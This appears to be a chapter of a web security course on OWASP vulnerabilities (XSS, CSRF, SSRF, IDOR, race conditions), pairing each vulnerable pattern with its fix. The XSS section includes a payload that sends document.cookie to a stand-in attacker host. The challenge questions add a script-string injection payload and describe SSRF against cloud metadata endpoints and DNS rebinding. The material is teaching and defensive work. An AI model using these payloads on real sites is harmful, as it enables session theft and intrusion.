# Chapter 12 — Web Vulnerabilities (OWASP Top 10)

> "Every vulnerability in this chapter can exist behind a flawless TLS connection, using a properly-generated AES key, verified by a certificate chain that checks out completely. None of them are cryptography failures. All of them are broken assumptions."

---

## The Problem

Chapter 11 closed on a specific gap: TLS protects data *in transit* between two endpoints, and says nothing at all about bugs in the application logic running at either end. This chapter is that gap, made concrete. Every vulnerability here is derived the same way — a specific vulnerable pattern, the exact mechanical steps an attacker takes to exploit it, and a fix explained precisely enough that it's clear *what specific mechanism* the fix closes, not just "sanitize your input" as an incantation. These categories are drawn from the OWASP Top 10, the standard, periodically-updated industry reference for exactly this material (most recently revised in 2025) — Broken Access Control, the category IDOR falls under (§12.4), has been the single most common category in the most recent edition.

One closely related vulnerability — SQL injection — is deliberately **not** re-derived here: this curriculum already has a full, dedicated treatment of it in [`08_SQL/33_SQL_Security_Injection.md`](../../../08_SQL/33_SQL_Security_Injection.md). It's worth naming the structural connection anyway, since it recurs constantly in this chapter: SQL injection and XSS (§12.1) are the *same underlying disease* — attacker-controlled data getting interpreted as executable syntax instead of inert data — expressed through two different parsers (a database's SQL parser versus a browser's HTML/JS parser).

---

## 12.1 Cross-Site Scripting (XSS)

**The mechanism.** A web page is HTML, and a browser's HTML parser makes no inherent distinction between "markup the developer wrote" and "data a user submitted" — it just parses whatever bytes arrive. If attacker-controlled data gets inserted into a page's HTML **without neutralizing HTML-special characters first**, and that data happens to contain something that looks like a `<script>` tag, the browser cannot tell the difference. It parses it as a script tag, because that's what it is, syntactically, regardless of who wrote it.

**Vulnerable code**, rendering a user comment directly into a page:

```python
def render_comment_vulnerable(username, comment):
    return f"<div class='comment'><b>{username}</b>: {comment}</div>"
```

**Verified** with a real attacker payload:

```
Attacker-submitted comment: <script>fetch('https://evil.example/steal?cookie='+document.cookie)</script>

VULNERABLE output: <div class='comment'><b>mallory</b>: <script>fetch(...)</script></div>
Contains a live <script> tag that a browser will parse and execute: True
```

Any visitor who views this comment has that script run in their browser, in the security context of the site they're visiting — with access to whatever that context grants, including (as this example shows) their own cookies.

**The fix, and precisely what it does mechanically:**

```python
def render_comment_fixed(username, comment):
    return f"<div class='comment'><b>{html.escape(username)}</b>: {html.escape(comment)}</div>"
```

```
FIXED output: <div class='comment'><b>mallory</b>: &lt;script&gt;fetch(...)&lt;/script&gt;</div>
Contains a live <script> tag: False
```

`html.escape` converts `<` to `&lt;`, `>` to `&gt;`, and similarly for `&`, `"`, and `'`. **This doesn't remove the attacker's words from the page — the comment is still fully displayed as text.** What it removes is the browser HTML parser's ability to interpret those specific characters as "start of a tag" rather than "literal less-than sign." The escaping targets the *parser's* syntax, not the content's meaning — which is exactly why it has to be applied consistently, everywhere untrusted data enters a page, and exactly why (Section Challenge Q1) the *specific* characters that need escaping change depending on exactly where in the page the data lands.

**The three variants, distinguished by *where* the vulnerable step actually happens:**

- **Reflected XSS**: the payload rides in a single request and gets echoed straight back in that same response (a search box that renders `?q=<script>...` directly into a "results for..." heading) — requires tricking a victim into clicking a crafted link containing the payload.
- **Stored XSS**: the payload is saved server-side (exactly the comment example above) and served to **every** future visitor who views that content — no malicious link required, and the blast radius is every viewer, not just one tricked victim.
- **DOM-based XSS**: the vulnerability never touches the server at all. Client-side JavaScript reads some attacker-influenced value already available in the browser (`location.hash`, `document.referrer`) and writes it into the page unsafely — `element.innerHTML = someValue` instead of `element.textContent = someValue` — meaning a server that does *everything* right (escapes every byte it ever sends) can still be exploited if its own client-side script mishandles data *after* the page has already loaded.

---

## 12.2 Cross-Site Request Forgery (CSRF)

**The mechanism.** Browsers automatically attach a site's cookies to *every* request sent to that site's domain — regardless of which page or origin actually triggered the request. This is intentional, ordinary browser behavior (it's how a logged-in session persists as you click around a site's own pages). The problem: if a state-changing endpoint authenticates a request using **only** "does a valid session cookie exist," it has no way to distinguish "the user intentionally clicked a button on our own page" from "the user's browser is loading a request to us that some *completely different, malicious* page triggered while the user happened to have our session cookie stored."

**Verified.** A vulnerable transfer endpoint checks only the session cookie:

```
Attacker's forged cross-site request (browser auto-attaches victim's real cookie):
  Result: (True, 'transferred 999 from alice to attacker')
  Alice's balance after the forged request: 1   (was 1000)
```

The forged request never touched Alice's actual password or session token directly — it relied entirely on the browser's automatic, unconditional cookie attachment.

**The fix: a CSRF token** — a random, unpredictable, per-session value embedded in the *legitimate* page's form, required (and checked server-side) on every state-changing submission. **Why the attacker's forged request can't include a valid one:** the browser's same-origin policy prevents JavaScript running on the attacker's page from *reading* the content of a page loaded from a different origin (`bank.example`). The attacker's page can still trigger the victim's browser to *send* a request there — that part isn't blocked — but it has no way to first read the real page and extract the real token value. Any request it constructs is missing the one piece of data only the legitimate page ever had.

**Verified:**

```
Same forged request against a CSRF-token-protected endpoint:
  Result: (False, 'CSRF token missing or incorrect -- request rejected')
  Alice's balance after the forged request: 1000   (unchanged)
A LEGITIMATE request from alice's own page (knows the real token): (True, 'transferred 50 from alice to bob')
```

The cookie still gets attached automatically either way — CSRF protection doesn't fight that browser behavior, it adds an independent check the attacker structurally cannot satisfy.

---

## 12.3 Server-Side Request Forgery (SSRF)

**The mechanism.** A server feature that fetches a URL supplied by a user — image-by-URL uploads, webhook testers, PDF generators pulling in remote assets — makes that HTTP request from the **server's** network position, not the attacker's. If the server doesn't restrict which URLs it's willing to fetch, an attacker can point it at addresses reachable only from *inside* the server's own network: internal admin panels, databases with no public exposure, or — a genuinely high-value real target — cloud provider metadata endpoints (commonly `http://169.254.169.254/...`), which on many cloud platforms serve a virtual machine's own credentials to *anything* that asks *from inside that VM*, on the assumption that only the VM itself could ever reach that address. A server trusted enough to sit inside a network perimeter becomes the attacker's proxy directly *into* that perimeter.

**The fix, honestly scoped:** restrict which destinations a server-side fetcher may reach — ideally via an **allowlist** of expected external hosts, rather than a **blocklist** of known-internal ranges, because blocklists are notoriously incomplete: alternate IP representations, redirects from an allowed external URL to a disallowed internal one, and (Section Challenge Q2) DNS tricks can all slip past a naive check. Unlike this chapter's other vulnerabilities, SSRF genuinely doesn't have one clean, complete fix at the application-validation layer alone — the more robust mental model is restricting *at the network level* what the fetching service can route to in the first place, rather than relying purely on a validation function to catch every disguised internal address.

---

## 12.4 Insecure Direct Object Reference (IDOR)

**The mechanism.** **Authentication** (proving *who* you are) and **authorization** (proving you're *allowed to access this specific resource*) are two genuinely different checks, and a common, serious bug is implementing only the first. An endpoint that fetches a resource purely by an ID present in the request — `GET /api/invoices/1234` — while checking only "is someone logged in" rather than "does *this* logged-in user own or have permission for *this specific* ID" — hands any authenticated user the ability to access any other user's data, simply by changing a number.

**Verified.** Bob, legitimately authenticated as himself, requests invoice `1001` — which belongs to Alice:

```
VULNERABLE endpoint: status=ok, data={'owner': 'alice', 'amount': 250}
FIXED endpoint:      status=forbidden -- not your invoice, data=None
```

The fixed version adds exactly one check the vulnerable version skipped — confirming the fetched resource's owner matches the authenticated requester — closing the gap without changing anything else about how the endpoint works. This is not an exotic vulnerability: Broken Access Control, the category IDOR belongs to, is the single most common category in the current OWASP Top 10, precisely because this specific mistake — checking *that* someone is logged in and forgetting to check *what* they're logged in to access — is easy to introduce and easy to overlook in code review.

---

## 12.5 Race Conditions

**The mechanism: time-of-check to time-of-use (TOCTOU).** Many operations naturally decompose into two separate steps — **check** some condition, then **act** based on that check (verify a coupon hasn't been used yet, *then* mark it used; verify sufficient balance, *then* deduct it). If those two steps aren't performed as a single, indivisible unit, and the *same* check-then-act sequence can run concurrently — multiple simultaneous requests, whether from an accidental double-click or an attacker deliberately firing many parallel requests — several concurrent executions can all pass the **check** (all reading the same "not yet used" state) before **any** of them completes the **act** (marking it used), and the protected action ends up applied multiple times instead of once.

**Verified with real concurrent threads — not simulated, not described, actually run.** A "coupon" object with an unsynchronized check-then-act `redeem()` method, hit by 30 threads released simultaneously via a `threading.Barrier`, with a small artificial delay between the check and the act to widen the race window:

```
VULNERABLE (check-then-act, no lock): 30 concurrent redeem() calls on ONE coupon
  Number of threads that successfully redeemed: 30   (correct answer should be 1)
  coupon.redemption_count = 30
```

Every single one of the 30 concurrent requests believed it was the one legitimate redemption — each read `used == False` before any of the others had a chance to set it to `True`. **The exact same logic, with the check-and-act wrapped in a single lock:**

```python
def redeem(self):
    with self.lock:              # CHECK and ACT are now one atomic unit
        if not self.used:
            time.sleep(0.005)
            self.used = True
            return True
        return False
```

```
FIXED (lock around check-and-act): 30 concurrent redeem() calls on ONE coupon
  Number of threads that successfully redeemed: 1   (correct answer should be 1)
  coupon.redemption_count = 1
```

**Why this specific fix works, mechanically:** a lock (or, in a database, a transaction with appropriate row-level locking, or an atomic conditional-update operation) doesn't make any individual thread's check "smarter" — it eliminates the *window of time* during which a second thread could execute its own check before the first thread's act had completed. Closing that window is the fix; nothing about the check's logic itself needed to change.

---

## Section Challenge

---

**Q1.** A developer HTML-escapes all user input before inserting it into ordinary page content (`<div>{escaped_input}</div>`) and considers XSS fully handled sitewide. Elsewhere, the same site inserts a user's display name directly into an inline script: `<script>var name = "USER_INPUT_HERE";</script>`. Does HTML-escaping protect this second insertion point too?

<details>
<summary>Answer</summary>

**No — and this is a genuinely dangerous gap to miss, because the fix that worked perfectly in §12.1 does nothing here.** HTML-escaping neutralizes characters that matter for being interpreted as HTML *tags* — `<`, `>`, `&`, and quote characters relevant to HTML attributes. But a value inserted directly into a **JavaScript string literal** is being parsed by an entirely different piece of the browser, under entirely different syntax rules. A display name of `";alert(document.cookie);//` inserted into that template produces:

```
<script>var name = "";alert(document.cookie);//";</script>
```

The closing `"` ends the intended string literal, the `;` ends that statement, `alert(document.cookie)` becomes a brand-new, fully executable JavaScript statement, and `//` comments out the rest of the line so the syntax stays valid. **None of this required a single HTML tag character.** `<` and `>` never appear anywhere in the payload, so HTML-escaping — which only ever touches HTML-significant characters — passes this string through completely untouched, leaving the insertion point exactly as exploitable as if no escaping were applied at all.

**The general principle:** "escape user input" is not one universal operation — it is **context-dependent**, and the correct set of characters to neutralize depends entirely on *which* syntax parser will consume the data next: HTML tag content, an HTML attribute value, a JavaScript string, a CSS value, and a URL component are five different contexts with five different sets of dangerous characters and five different correct escaping functions. Applying the *right* escaping for the *wrong* context provides the same false sense of security as applying none — the fix has to match the destination, not just exist somewhere upstream of it.
</details>

---

**Q2.** A team defends their URL-fetching feature (§12.3) with a check that rejects any URL whose hostname resolves to a private or internal IP address **at the moment the check runs**. Is this sufficient?

<details>
<summary>Answer</summary>

**Not necessarily — this defense has exactly the same structural shape as §12.5's race condition, just manifesting through DNS timing instead of application threads, and it's worth recognizing the parallel explicitly.** DNS resolution and the actual network connection are two *separate* steps, happening at two different points in time. An attacker who controls a DNS name (a domain they own, pointed at infrastructure they control) can configure it to resolve to a harmless public IP address at the exact moment the server's validation check queries it — passing the check cleanly — and then, thanks to a deliberately very short DNS TTL, resolve to an internal/private IP address by the time the server actually opens the connection to fetch the resource moments later. This is called **DNS rebinding**.

This is precisely §12.5's **time-of-check to time-of-use** pattern, restated: the *check* (resolve the hostname, confirm it's not internal) and the *use* (actually connect to whatever the hostname resolves to right now) are not atomic — there's a window between them, and if the attacker controls what changes during that window (there, a shared mutable variable; here, a DNS record), the check's result can be stale and wrong by the time it matters. A validation step that only inspects the hostname's resolution *once, in advance* provides no real guarantee about what address the server actually ends up connecting to.

**The more robust fix follows the same logic §12.5's fix did: collapse the check and the use into one operation**, or eliminate the window entirely — validate the IP address actually being connected to at connection time (not a separately-resolved lookup beforehand), or better, restrict at the network/firewall level which addresses the fetching process is *able* to route to at all, so that even a successfully "rebound" internal address is simply unreachable regardless of what any application-level check believed at validation time.
</details>

---

**Q3.** Does switching to a deliberately slow password hash like bcrypt (Chapter 10) make an account-creation endpoint immune to the same kind of race condition demonstrated in §12.5 — for instance, a "sign up and claim a one-time-only signup bonus" feature?

<details>
<summary>Answer</summary>

**No — and slow hashing can, if anything, make this specific race *easier* to win, not harder, because it widens exactly the kind of window §12.5 identified as the root cause.** Chapter 10's bcrypt slowness solves a completely different problem: raising the *per-guess* cost of a brute-force or dictionary attack against a stored password hash. It says nothing whatsoever about *atomicity* — whether a "check eligibility, then grant the bonus" sequence is protected from concurrent execution.

If a signup endpoint's logic is check-then-act — "is this bonus still available?" followed later by "mark it claimed," with a slow bcrypt hash computation sitting in between those two steps — then multiple concurrent signup requests can all pass the *availability check* while several slow hashing operations are still independently in flight, all before any one of them reaches the "mark claimed" step. A slower per-request processing time doesn't close this race — by keeping each request "in flight" for longer, it can make the race window *larger*, giving more concurrent requests more time to all pass the check before any of them completes the act.

**This is the same "independent failure axes" lesson recurring once more, now linking Chapter 10 and this chapter directly:** password-hashing strength (Ch10) and operation atomicity (Ch12, §12.5) are two entirely unrelated properties of a system, addressing two entirely unrelated threats. Strengthening one provides no protection against the other, and — as this specific example shows — a defense aimed at one problem can occasionally make an *unrelated* problem measurably worse, purely as an accidental side effect of changing how long an unprotected window stays open.
</details>

---

## Chapter Summary

| Vulnerability | Key Point |
|---|---|
| XSS (reflected/stored/DOM) | Attacker data parsed as markup instead of text — verified escaping neutralizes tag-parsing without removing the visible content; three variants distinguished by *where* the unsafe insertion happens (single response, stored content, or client-side JS) |
| CSRF | Browsers auto-attach cookies regardless of request origin — verified a cookie-only endpoint is forgeable cross-site, while an unpredictable per-session token (unreadable by the attacker's page, per same-origin policy) blocks the forgery |
| SSRF | A server-side fetcher makes requests from the server's trusted network position — verified reasoning around allowlists vs. incomplete blocklists; honestly flagged as lacking one clean fix |
| IDOR | Authentication (who you are) and authorization (what you may access) are different checks — verified a vulnerable endpoint leaking another user's data by ID alone, and a fixed endpoint enforcing ownership |
| Race conditions (TOCTOU) | Unsynchronized check-then-act sequences let concurrent requests all pass the check before any completes the act — verified with real threads: 30/30 over-redemptions unprotected, exactly 1/30 with a lock |
| SQL injection | Structurally the same "data parsed as code" disease as XSS — full derivation deferred to the existing dedicated chapter, [`08_SQL/33_SQL_Security_Injection.md`](../../../08_SQL/33_SQL_Security_Injection.md) |

**Where we go next:** Every vulnerability in this chapter is a specific, local bug — one endpoint, one code path. Chapter 13 closes the course by building the systematic process for finding these classes of bug *before* they ship: threat modeling, structured around the same defenses this entire course has been deriving since Chapter 1.

---

*Next: [13 — Threat Modeling & Secure SDLC](13_Threat_Modeling_Secure_SDLC.md)*
